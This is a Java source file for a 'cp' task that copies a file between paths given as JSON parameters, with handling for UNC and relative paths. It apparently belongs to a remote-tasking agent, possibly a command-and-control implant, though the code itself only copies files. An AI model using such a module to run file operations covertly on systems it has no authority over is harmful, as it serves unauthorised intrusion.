package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.HashMap;
import java.util.Map;

/**
 * Copy file task
 */
public class CpTask implements Task {
    
    private final ObjectMapper objectMapper = new ObjectMapper();
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        // Extract source and destination parameters
        String source = parameters.has("source") ? parameters.get("source").asText() : "";
        String destination = parameters.has("destination") ? parameters.get("destination").asText() : "";
        
        if (source.isEmpty()) {
            throw new Exception("source parameter is required");
        }
        
        if (destination.isEmpty()) {
            throw new Exception("destination parameter is required");
        }
        
        Config.debugLog(config, "Cp request - source: '" + source + "', destination: '" + destination + "'");
        
        // Resolve source path
        boolean isSourceUnc = source.startsWith("\\\\");
        
        // Fix malformed UNC paths from JSON parsing
        if (!isSourceUnc && source.startsWith("\\") && source.length() > 2 && source.charAt(1) != ':') {
            source = "\\" + source;
            isSourceUnc = true;
            Config.debugLog(config, "Fixed malformed source UNC path: " + source);
        }
        
        Path sourcePath = Paths.get(source);
        if (!sourcePath.isAbsolute()) {
            String cwd = System.getProperty("user.dir");
            sourcePath = Paths.get(cwd).resolve(source);
            Config.debugLog(config, "Resolved source relative to CWD: " + sourcePath);
        }
        
        // For UNC paths, use original path string for error messages
        String sourcePathForDisplay = isSourceUnc ? source : sourcePath.toAbsolutePath().toString();
        
        // Check if source exists
        if (!Files.exists(sourcePath)) {
            throw new Exception("Source file does not exist: " + sourcePathForDisplay);
        }
        
        // Get real source path
        sourcePath = sourcePath.toRealPath();
        Config.debugLog(config, "Real source path: " + sourcePath);
        
        // Resolve destination path
        boolean isDestUnc = destination.startsWith("\\\\");
        
        // Fix malformed UNC paths from JSON parsing
        if (!isDestUnc && destination.startsWith("\\") && destination.length() > 2 && destination.charAt(1) != ':') {
            destination = "\\" + destination;
            isDestUnc = true;
            Config.debugLog(config, "Fixed malformed destination UNC path: " + destination);
        }
        
        Path destPath = Paths.get(destination);
        if (!destPath.isAbsolute()) {
            String cwd = System.getProperty("user.dir");
            destPath = Paths.get(cwd).resolve(destination);
            Config.debugLog(config, "Resolved destination relative to CWD: " + destPath);
        }
        
        // If destination is a directory, append source filename
        if (Files.isDirectory(destPath)) {
            destPath = destPath.resolve(sourcePath.getFileName());
            Config.debugLog(config, "Destination is directory, appending filename: " + destPath);
        }
        
        Config.debugLog(config, "Final destination path: " + destPath);
        
        // Copy the file
        Files.copy(sourcePath, destPath, StandardCopyOption.REPLACE_EXISTING);
        
        // Return success message
        return "Copied '" + sourcePath.toString() + "' to '" + destPath.toString() + "'";
    }
    
    @Override
    public String getCommandName() {
        return "cp";
    }
}
